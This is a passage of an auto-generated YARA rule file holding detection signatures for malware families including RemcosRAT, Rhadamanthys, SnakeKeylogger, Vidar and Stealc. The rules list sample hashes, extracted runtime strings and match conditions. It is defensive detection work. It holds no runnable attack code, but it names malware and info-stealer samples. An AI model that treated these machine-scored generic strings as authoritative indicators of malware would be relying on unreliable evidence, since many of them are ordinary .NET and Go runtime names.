      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash15 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash16 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash17 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash18 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.getStackMap" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.getArgInfo" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.heapBits.forwardOrBoundary" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.heapBits.forward" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.name.data" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.name.isExported" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.name.tag" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.scanstack.func1" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imp_81 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash4 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "HSystem.ComponentModel.Primitives.dll" fullword ascii /* score: '29.00'*/
      $s2 = "\"SafeProcessHandle" fullword ascii /* score: '15.00'*/
      $s3 = "zSystem.Collections.Generic.IEnumerable<TSource>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "VGetOrCreateThreadLocalCompletionCountObject" fullword ascii /* score: '14.00'*/
      $s5 = ".<ExecuteCallback>b__9_0" fullword ascii /* score: '14.00'*/
      $s6 = "GetData2<get_ComputerName>b__10_0B<GetPerformanceCounterLib>b__14_0@" fullword ascii /* score: '12.00'*/
      $s7 = "LastIndexOf(GetSystemArrayEEType" fullword ascii /* score: '12.00'*/
      $s8 = "&MakeHRFromErrorCode<ThrowInvalidOperationException" fullword ascii /* score: '12.00'*/
      $s9 = "HeaderLength0" fullword ascii /* score: '10.00'*/
      $s10 = "\"get_FinalizerCode.get_NullableValueOffset" fullword ascii /* score: '9.00'*/
      $s11 = "GetDataItem&set_EncoderFallback@" fullword ascii /* score: '9.00'*/
      $s12 = " CompleteTimedOut@" fullword ascii /* score: '9.00'*/
      $s13 = "Content-Dispositio" fullword wide /* score: '9.00'*/
      $s14 = "Content-Languag" fullword wide /* score: '9.00'*/
      $s15 = "Content-Lengt" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_82 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash7 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash8 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash9 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash10 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s2 = "RecycleId$GetCurrentThreadId" fullword ascii /* score: '15.00'*/
      $s3 = ".AbandonedMutexException" fullword ascii /* score: '15.00'*/
      $s4 = "bTryStartProcessingHighPriorityWorkItemsAndDequeue@" fullword ascii /* score: '15.00'*/
      $s5 = "SignalAll" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s6 = "IKeyedItem`1\"ConcurrentQueue`1" fullword ascii /* score: '12.00'*/
      $s7 = "GetInt16Config" fullword ascii /* score: '12.00'*/
      $s8 = "BCopyToTempBufferWithoutWhiteSpace" fullword ascii /* score: '11.00'*/
      $s9 = ".NET Long Running Tas" fullword wide /* score: '10.00'*/
      $s10 = "System.Threading.ThreadPool.UseWindowsThreadPoo" fullword wide /* score: '10.00'*/
      $s11 = "There are too many threads currently waiting on the event. A maximum of {0} waiting threads are supported" fullword wide /* score: '10.00'*/
      $s12 = "&get_InnerExceptions@" fullword ascii /* score: '9.00'*/
      $s13 = "GetExceptions@" fullword ascii /* score: '9.00'*/
      $s14 = "get_Options@" fullword ascii /* score: '9.00'*/
      $s15 = "GetValueNames@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash_83 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "roc1: new g is not Gdeadnewproc1: newg missing stackos: process already finishedprotocol driver not attachedreflect: In of non-f" ascii /* score: '18.00'*/
      $s2 = "*runtime.headTailIndex" fullword ascii /* score: '12.00'*/
      $s3 = "f*struct { F uintptr; size uintptr; align uintptr; sysStat *runtime.sysMemStat; p **runtime.notInHeap }" fullword ascii /* score: '11.00'*/
      $s4 = "*runtime.sysMemStat" fullword ascii /* score: '11.00'*/
      $s5 = "runtime/internal/sys.DefaultGoroot.str" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.asyncPreempt.args_stackmap" fullword ascii /* score: '10.00'*/
      $s7 = "nextSpanForSweep" fullword ascii /* score: '9.00'*/
      $s8 = "incHead" fullword ascii /* score: '9.00'*/
      $s9 = "decHead" fullword ascii /* score: '9.00'*/
      $s10 = "checkmarks" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__84 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash7 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash8 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash9 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s3 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.sweepone.func1" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.offAddr.add" fullword ascii /* score: '13.00'*/
      $s7 = "*runtime.errorAddressString" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.pMask.set" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.(*errorAddressString).Error" fullword ascii /* score: '13.00'*/
      $s10 = "*runtime.pcHeader" fullword ascii /* score: '12.00'*/
      $s11 = "runtime.(*mheap).nextSpanForSweep" fullword ascii /* score: '12.00'*/
      $s12 = "runtime.sweepClass.split" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.getMCache" fullword ascii /* score: '11.00'*/
      $s14 = "runtime.offAddrToLevelIndex" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*mspan).reportZombies" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_85 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash5 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash6 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "<InitializeUserDefaultUICultureLGetCultureNotSupportedExceptionMessage0CreateCultureInfoNoThrow" fullword ascii /* score: '15.00'*/
      $s2 = "(get_CurrentUICulture(set_CurrentUICulture0get_UserDefaultUICulture(get_InvariantCulture" fullword ascii /* score: '12.00'*/
      $s3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zone" fullword wide /* score: '12.00'*/
      $s4 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\UT" fullword wide /* score: '12.00'*/
      $s5 = "*GetUserDefaultCulture.GetUserDefaultUICulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s6 = ">CompareAdjustmentRuleToDateTime@" fullword ascii /* score: '10.00'*/
      $s7 = "GetUtcOffset@" fullword ascii /* score: '9.00'*/
      $s8 = "&GetUtcOffsetFromUtc" fullword ascii /* score: '9.00'*/
      $s9 = "DGetDaylightSavingsEndOffsetFromUtc" fullword ascii /* score: '9.00'*/
      $s10 = " GetCultureByName" fullword ascii /* score: '9.00'*/
      $s11 = "&GetEnumerableSorter@" fullword ascii /* score: '9.00'*/
      $s12 = "@TryGetEndOfDstIfYearStartWithDst" fullword ascii /* score: '9.00'*/
      $s13 = "0GetAdjustmentRuleForTime@" fullword ascii /* score: '9.00'*/
      $s14 = "get_DayOfWeek@" fullword ascii /* score: '9.00'*/
      $s15 = "(GetCorrespondingKind@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5867427e_RemcosRAT_signature__770b35ba_86 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5867427e.vbs, RemcosRAT(signature)_770b35ba.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5867427e2a69435285a061f4cc882429558b4f7a2c0569219e74fdb7d68ec877"
      hash2 = "770b35baa103302f231c6be89e96d55294801a04aee02693842aa745f6dce621"
   strings:
      $s1 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s2 = "' Log any SMTP errors" fullword ascii /* score: '17.00'*/
      $s3 = "' SMTP 'To' email address. Multiple addresses are separated by commas" fullword ascii /* score: '15.00'*/
      $s4 = "End Sub ' ProcessEvent" fullword ascii /* score: '15.00'*/
      $s5 = "' Optional password (may be required for SMTP authentication)" fullword ascii /* score: '13.00'*/
      $s6 = "' Globals from command line" fullword ascii /* score: '12.00'*/
      $s7 = "End Sub ' SSMON_ParseCommandLine" fullword ascii /* score: '12.00'*/
      $s8 = "End Sub ' SSMON_LogError" fullword ascii /* score: '12.00'*/
      $s9 = "' SMTP server object (from config file)" fullword ascii /* score: '12.00'*/
      $s10 = "' Log any network errors" fullword ascii /* score: '12.00'*/
      $s11 = "' strUser has User + Date + Time, and should still be parsed" fullword ascii /* score: '11.00'*/
      $s12 = "' SMTP email subject" fullword ascii /* score: '9.00'*/
      $s13 = "' Log progress" fullword ascii /* score: '9.00'*/
      $s14 = "' SMTP 'From' field" fullword ascii /* score: '9.00'*/
      $s15 = "= 5 ' Comment: <Comment> (ends with blank line)" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_87 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash4 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $x1 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a$Perf" ascii /* score: '32.00'*/
      $x2 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a$Perf" ascii /* score: '32.00'*/
      $s3 = "&GetProcessShortName" fullword ascii /* score: '20.00'*/
      $s4 = "\"GetCurrentProcess" fullword ascii /* score: '20.00'*/
      $s5 = "Couldn't get process information from performance counter" fullword wide /* score: '20.00'*/
      $s6 = " OpenProcessToken" fullword ascii /* score: '18.00'*/
      $s7 = "Feature requires a process identifier" fullword wide /* score: '18.00'*/
      $s8 = "Process performance counter is disabled, so the requested operation cannot be performed" fullword wide /* score: '16.00'*/
      $s9 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s10 = "&NtProcessInfoHelper" fullword ascii /* score: '15.00'*/
      $s11 = "No process is associated with this object" fullword wide /* score: '15.00'*/
      $s12 = "Process has exited, so the requested information is not available" fullword wide /* score: '15.00'*/
      $s13 = "Attempt to access the method failed" fullword wide /* score: '14.00'*/
      $s14 = "Attempt to access the type failed" fullword wide /* score: '14.00'*/
      $s15 = "waitHandl" fullword wide /* base64 encoded string */ /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_88 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "NSystem.Diagnostics.DiagnosticSource.dll4System.Diagnostics.Process" fullword ascii /* score: '27.00'*/
      $s2 = "System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s3 = "System.Runtime.CompilerServices.IStateMachineBoxAwareAwaiter.AwaitUnsafeOnCompleted@" fullword ascii /* score: '20.00'*/
      $s4 = "$System.Console.dllFSystem.Diagnostics.DiagnosticSource" fullword ascii /* score: '16.00'*/
      $s5 = "System.Diagnostics.DiagnosticListener" fullword ascii /* score: '13.00'*/
      $s6 = "GetKeyAtIndex" fullword ascii /* score: '12.00'*/
      $s7 = " GetKeyListHelper@" fullword ascii /* score: '12.00'*/
      $s8 = "get_ErrorCode@" fullword ascii /* score: '12.00'*/
      $s9 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker2Cu" ascii /* score: '11.00'*/
      $s10 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker2Cu" ascii /* score: '11.00'*/
      $s11 = "System.Diagnostics.DiagnosticSource" fullword ascii /* score: '10.00'*/
      $s12 = "0NotFiniteNumberException.NotImplementedException*NotSupportedException" fullword ascii /* score: '10.00'*/
      $s13 = "GetStatus@" fullword ascii /* score: '9.00'*/
      $s14 = "get_Token@" fullword ascii /* score: '9.00'*/
      $s15 = " CombineSelectorsM" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_89 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
   strings:
      $s1 = "*NDynamicGenericMethodComponentsHashtableDMethodDescBasedGenericMethodLookup" fullword ascii /* score: '13.00'*/
      $s2 = "*2RuntimeMethodKeyHashtable" fullword ascii /* score: '13.00'*/
      $s3 = "get_ReturnType4get_RuntimeReturnParameter@" fullword ascii /* score: '12.00'*/
      $s4 = ":get_ContainsGenericParameters$GetRootElementType" fullword ascii /* score: '12.00'*/
      $s5 = "&GetMethodImplCommon" fullword ascii /* score: '12.00'*/
      $s6 = "<get_IsConstructedGenericMethod&get_IsGenericMethod:get_IsGenericMethodDefinition0get_RuntimeDeclaringType@" fullword ascii /* score: '12.00'*/
      $s7 = " CompilerServices" fullword ascii /* score: '12.00'*/
      $s8 = "*,RuntimeMethodHandleKey" fullword ascii /* score: '10.00'*/
      $s9 = "*<InstantiatedMethodKeyHashtable" fullword ascii /* score: '10.00'*/
      $s10 = "*8InstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s11 = "*8DynamicGenericTypesHashtable*GenericTypeLookupData*LazyDictionaryContext" fullword ascii /* score: '10.00'*/
      $s12 = "*<DynamicGenericMethodsHashtable.GenericMethodLookupData" fullword ascii /* score: '10.00'*/
      $s13 = "**RuntimeFieldHandleKey" fullword ascii /* score: '10.00'*/
      $s14 = "**ArrayTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s15 = "*JMethodForInstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imphash__SnakeKeylogger_signature__995cce3d6fb20b2d8af502c8788f55d_90 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash2 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "@GetRuntimeMethodHandleComponents>GetRuntimeFieldHandleComponents@" fullword ascii /* score: '15.00'*/
      $s2 = "dSystem.Collections.Generic.ICollection<TValue>.Add@" fullword ascii /* score: '13.00'*/
      $s3 = "GetHashCode#" fullword ascii /* score: '12.00'*/
      $s4 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker" fullword ascii /* score: '11.00'*/
      $s5 = "TryGetSingle" fullword ascii /* score: '9.00'*/
      $s6 = "get_ParentName8get_TwoLetterISOLanguageName6get_TwoLetterISOCountryName(get_NumberGroupSizes@" fullword ascii /* score: '9.00'*/
      $s7 = "get_CanRead$GetIndexParameters" fullword ascii /* score: '8.00'*/
      $s8 = "bufferq" fullword ascii /* score: '8.00'*/
      $s9 = "buffersu" fullword ascii /* score: '8.00'*/
      $s10 = "offsety" fullword ascii /* score: '8.00'*/
      $s11 = "suffixm" fullword ascii /* score: '8.00'*/
      $s12 = "2CustomMethodInvokerAction" fullword ascii /* score: '8.00'*/
      $s13 = "prefixi" fullword ascii /* score: '8.00'*/
      $s14 = "optionse" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_RemcosRAT_signature__aa569300_91 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash3 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
      hash4 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /**/ /* score: '26.50'*/
      $s3 = "3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s5 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '18.50'*/
